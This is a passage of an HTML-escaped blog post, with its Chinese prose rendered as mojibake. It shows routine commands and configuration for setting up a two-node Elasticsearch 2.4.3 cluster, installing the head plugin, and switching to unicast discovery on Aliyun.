&lt;h3 id=&quot;æµ‹è¯•è®¿é—®æœåŠ¡æ­£å¸¸ï¼š&quot;&gt;&lt;a href=&quot;#æµ‹è¯•è®¿é—®æœåŠ¡æ­£å¸¸ï¼š&quot; class=&quot;headerlink&quot; title=&quot;æµ‹è¯•è®¿é—®æœåŠ¡æ­£å¸¸ï¼š&quot;&gt;&lt;/a&gt;æµ‹è¯•è®¿é—®æœåŠ¡æ­£å¸¸ï¼š&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[elasticsearch@es_01 elasticsearch]$  curl http://10.47.88.206:9200&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;name&quot;&lt;/span&gt; : &lt;span class=&quot;string&quot;&gt;&quot;es_01&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;cluster_name&quot;&lt;/span&gt; : &lt;span class=&quot;string&quot;&gt;&quot;elk_cluster&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;cluster_uuid&quot;&lt;/span&gt; : &lt;span class=&quot;string&quot;&gt;&quot;mspLZT5nTL-d124suNbBBQ&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;version&quot;&lt;/span&gt; : &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&quot;number&quot;&lt;/span&gt; : &lt;span class=&quot;string&quot;&gt;&quot;2.4.3&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&quot;build_hash&quot;&lt;/span&gt; : &lt;span class=&quot;string&quot;&gt;&quot;d38a34e7b75af4e17ead16f156feffa432b22be3&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&quot;build_timestamp&quot;&lt;/span&gt; : &lt;span class=&quot;string&quot;&gt;&quot;2016-12-07T16:28:56Z&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&quot;build_snapshot&quot;&lt;/span&gt; : &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&quot;lucene_version&quot;&lt;/span&gt; : &lt;span class=&quot;string&quot;&gt;&quot;5.5.2&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;#125;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;tagline&quot;&lt;/span&gt; : &lt;span class=&quot;string&quot;&gt;&quot;You Know, for Search&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;ä¸‹é¢æ˜¯å†™å¼€æœºå¯åŠ¨è„šæœ¬ï¼Œä¸å†™çš„ç›´æ¥åˆ‡æ¢esç”¨æˆ·åˆ°ç›®å½•å¯åŠ¨ -dåå°å¯åŠ¨ã€‚&lt;br&gt;è¿™é‡Œéœ€è¦/etc/init.d/åˆ›å»ºå¯åŠ¨è„šæœ¬ã€‚&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[root@ELK ~]&lt;span class=&quot;comment&quot;&gt;# git clone https://github.com/elastic/elasticsearch-servicewrapper.git&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Initialized empty Git repository &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; /root/elasticsearch-servicewrapper/.git/&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;remote: Counting objects: 184, done.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;remote: Total 184 (delta 0), reused 0 (delta 0), pack-reused 184&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Receiving objects: 100% (184/184), 4.55 MiB | 511 KiB/s, done.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Resolving deltas: 100% (53/53), done.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@ELK elasticsearch-servicewrapper]&lt;span class=&quot;comment&quot;&gt;# mv service/ /usr/local/elasticsearch/bin/&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@ELK elasticsearch-servicewrapper]&lt;span class=&quot;comment&quot;&gt;# cd /usr/local/elasticsearch&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@ELK elasticsearch]&lt;span class=&quot;comment&quot;&gt;# /usr/local/elasticsearch/bin/service/elasticsearch install    è¿™é‡Œæ˜¯å®‰è£…es&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Detected RHEL or Fedora:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Installing the Elasticsearch daemon..&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@ELK elasticsearch]&lt;span class=&quot;comment&quot;&gt;# vim /etc/init.d/elasticsearch   æŸ¥çœ‹å®‰è£…eså¯åŠ¨é…ç½®æ–‡ä»¶&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@ELK elasticsearch]&lt;span class=&quot;comment&quot;&gt;# service elastic search start  å¯åŠ¨es &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Starting Elasticsearch...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Waiting &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; Elasticsearch......&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;running: PID:31360   æœåŠ¡å·²å¯åŠ¨äº†ã€‚&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;å¯åŠ¨ç›¸å…³æœåŠ¡&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;service elasticsearch start&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;service elasticsearch status&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;é…ç½® elasticsearch æœåŠ¡éšç³»ç»Ÿè‡ªåŠ¨å¯åŠ¨&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# chkconfig --add elasticsearch&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;æµ‹è¯•ElasticSearchæœåŠ¡æ˜¯å¦æ­£å¸¸ï¼Œé¢„æœŸè¿”å›200çš„çŠ¶æ€ç &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# curl -X GET http://localhost:9200&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;es-02æœåŠ¡ç«¯èŠ‚ç‚¹ï¼š&quot;&gt;&lt;a href=&quot;#es-02æœåŠ¡ç«¯èŠ‚ç‚¹ï¼š&quot; class=&quot;headerlink&quot; title=&quot;es_02æœåŠ¡ç«¯èŠ‚ç‚¹ï¼š&quot;&gt;&lt;/a&gt;es_02æœåŠ¡ç«¯èŠ‚ç‚¹ï¼š&lt;/h3&gt;&lt;p&gt;ç¬¬ä¸€æ­¥åŸºç¡€é…ç½®éƒ½æ˜¯ä¸€æ ·çš„ï¼Œè·Ÿes_01èŠ‚ç‚¹ä¸€æ ·ã€‚  å…¶ä»–åªéœ€è¦åˆ°es_01æ‹·è´è¿‡æ¥,ç„¶ååˆ›å»ºä¸‹esç”¨æˆ·ï¼Œä¿®æ”¹ä¸‹é…ç½®ã€‚&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;/usr/&lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt;/elasticsearch  ç›®å½•æ‹·è´åˆ°es_02æœºå™¨ã€‚&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;è¿™é‡Œéœ€è¦ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼š&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;é…ç½®å‰å…ˆåˆ›å»ºå‡ ä¸ªç›®å½•æ–‡ä»¶&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@es_01 srv]]&lt;span class=&quot;comment&quot;&gt;# mkdir /srv/data/es-data -p&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@es_01 srv]&lt;span class=&quot;comment&quot;&gt;# mkdir /srv/data/es-work &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ä¿®æ”¹æºç ç›®å½•å±æ€§å±ç»„ï¼š&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@es_01 elasticsearch]&lt;span class=&quot;comment&quot;&gt;# useradd  -s /sbin/nologin elasticsearch&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@es_01 elasticsearch]&lt;span class=&quot;comment&quot;&gt;# chown -R elasticsearch:elasticsearch /usr/local/elasticsearch/*&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@es_01 elasticsearch]&lt;span class=&quot;comment&quot;&gt;# chown -R elasticsearch:elasticsearch /srv/data/&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ä¿®æ”¹é…ç½®æ–‡ä»¶&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;vim elasticsearch.yml&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;node.name: es_02&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;network.host: 10.47.88.188&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;å…¶ä»–ä¸éœ€è¦ä¿®æ”¹&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;é›†ç¾¤èŠ‚ç‚¹es-02æµ‹è¯•ï¼š&quot;&gt;&lt;a href=&quot;#é›†ç¾¤èŠ‚ç‚¹es-02æµ‹è¯•ï¼š&quot; class=&quot;headerlink&quot; title=&quot;é›†ç¾¤èŠ‚ç‚¹es_02æµ‹è¯•ï¼š&quot;&gt;&lt;/a&gt;é›†ç¾¤èŠ‚ç‚¹es_02æµ‹è¯•ï¼š&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[root@es_02 home]&lt;span class=&quot;comment&quot;&gt;# curl http://10.47.88.188:9200&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;name&quot;&lt;/span&gt; : &lt;span class=&quot;string&quot;&gt;&quot;es_02&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;cluster_name&quot;&lt;/span&gt; : &lt;span class=&quot;string&quot;&gt;&quot;elk_cluster&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;cluster_uuid&quot;&lt;/span&gt; : &lt;span class=&quot;string&quot;&gt;&quot;-4Rqn4IzS1GfnsodqZD8Tg&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;version&quot;&lt;/span&gt; : &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&quot;number&quot;&lt;/span&gt; : &lt;span class=&quot;string&quot;&gt;&quot;2.4.3&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&quot;build_hash&quot;&lt;/span&gt; : &lt;span class=&quot;string&quot;&gt;&quot;d38a34e7b75af4e17ead16f156feffa432b22be3&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&quot;build_timestamp&quot;&lt;/span&gt; : &lt;span class=&quot;string&quot;&gt;&quot;2016-12-07T16:28:56Z&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&quot;build_snapshot&quot;&lt;/span&gt; : &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&quot;lucene_version&quot;&lt;/span&gt; : &lt;span class=&quot;string&quot;&gt;&quot;5.5.2&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;#125;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;tagline&quot;&lt;/span&gt; : &lt;span class=&quot;string&quot;&gt;&quot;You Know, for Search&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;elké›†ç¾¤å·²å®‰è£…é…ç½®å®Œæ¯•ï¼Œæˆ‘è¿™é‡Œé…ç½®äº†nginxåšä¸‹åå‘ä»£ç†ï¼Œèµ°80ç«¯å£å‡ºå»ã€‚ç„¶ååœ¨nginxè®¾ç½®ä¸‹å†…éƒ¨å…¬å¸è®¿é—®ä¸å¯¹å¤–å¼€æ”¾ã€‚&lt;/p&gt;
&lt;h3 id=&quot;å®‰è£…-headã€marvelã€bigdeskæ’ä»¶&quot;&gt;&lt;a href=&quot;#å®‰è£…-headã€marvelã€bigdeskæ’ä»¶&quot; class=&quot;headerlink&quot; title=&quot;å®‰è£… headã€marvelã€bigdeskæ’ä»¶:&quot;&gt;&lt;/a&gt;å®‰è£… headã€marvelã€bigdeskæ’ä»¶:&lt;/h3&gt;&lt;p&gt;es1.5æ’ä»¶å®‰è£…æ˜¯&lt;code&gt;./plugin -install xxx&lt;/code&gt;,è€Œes2.4æ’ä»¶å®‰è£…æ²¡æœ‰å‡å·&lt;code&gt;./plugin install xxx&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;1.5ç‰ˆæœ¬æ–¹æ³•ï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;* headæ’ä»¶&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;æ’ä»¶å®‰è£…æ–¹æ³•1ï¼š&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;/usr/&lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt;/elasticsearch/bin/plugin -install mobz/elasticsearch-head&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;é‡å¯es å³å¯ã€‚&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;æ‰“å¼€http://localhost:9200/_plugin/head/&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;æ’ä»¶å®‰è£…æ–¹æ³•2ï¼š&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;1.https://github.com/mobz/elasticsearch-headä¸‹è½½zip è§£å‹&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2.å»ºç«‹elasticsearch-1.0.0\plugins\head\_siteæ–‡ä»¶&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3.å°†è§£å‹åçš„elasticsearch-head-masteræ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶copyåˆ°_site&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;é‡å¯es å³å¯ã€‚&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;æ‰“å¼€http://localhost:9200/_plugin/head/&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;2.4ç‰ˆæœ¬ä»¥ä¸Šå®‰è£…ï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;* headæ’ä»¶&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;æ’ä»¶å®‰è£…æ–¹æ³•1ï¼š&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;/usr/&lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt;/elasticsearch/bin/plugin install mobz/elasticsearch-head&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;é‡å¯es å³å¯ã€‚&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;æ‰“å¼€http://localhost:9200/_plugin/head/&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;æ’ä»¶å®‰è£…æ–¹æ³•2ï¼š&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;1.https://github.com/mobz/elasticsearch-headä¸‹è½½zip è§£å‹&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2.å»ºç«‹elasticsearch-1.0.0\plugins\head\_siteæ–‡ä»¶&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3.å°†è§£å‹åçš„elasticsearch-head-masteræ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶copyåˆ°_site&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;é‡å¯es å³å¯ã€‚&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;æ‰“å¼€http://localhost:9200/_plugin/head/&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;ä¸ºäº†ä¿éšœæœç´¢æœåŠ¡çš„ç¨³å®šæ€§ï¼Œå¢åŠ äº†ä¸€å°æœºå™¨ï¼Œå°†Elasticsearchéƒ¨ç½²æˆäº†é›†ç¾¤æ¨¡å¼ï¼Œ éƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒæ—¶å‘ç°ï¼Œæ–°çš„èŠ‚ç‚¹å¹¶ä¸èƒ½è¢«å‘ç°ï¼Œåå°å‘ç°é˜¿é‡Œäº‘å¹¶ä¸æ”¯æŒå¤šæ’­ï¼Œæœ€ååªèƒ½æ”¹ä¸ºå•æ’­çš„æ–¹å¼é…ç½®äº†ï¼Œå¥½åœ¨ä¹‹åä¸€åˆ‡é¡ºåˆ©ã€‚&lt;/p&gt;
&lt;p&gt;ä¸‹é¢é™„ä¸Šæµ‹è¯•ç¯å¢ƒé…ç½®ç¤ºä¾‹ï¼šæ·»åŠ ä¸‹ä¸‹é¢ç›‘å¬é›†ç¾¤IPå’Œç«¯å£ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;es_01&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[root@es_01 config]&lt;span class=&quot;comment&quot;&gt;# vim elasticsearch.yml&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;discovery.zen.ping.multicast.enabled: &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;discovery.zen.ping.unicast.hosts: [&lt;span class=&quot;string&quot;&gt;&quot;10.47.88.206:9300&quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;10.47.88.188:9300&quot;&lt;/span&gt;]&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;es_02&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[root@es_02 config]&lt;span class=&quot;comment&quot;&gt;# vim elasticsearch.yml&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;discovery.zen.ping.multicast.enabled: &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;discovery.zen.ping.unicast.hosts: [&lt;span class=&quot;string&quot;&gt;&quot;10.47.88.206:9300&quot;&lt;/span&gt;,&lt;span 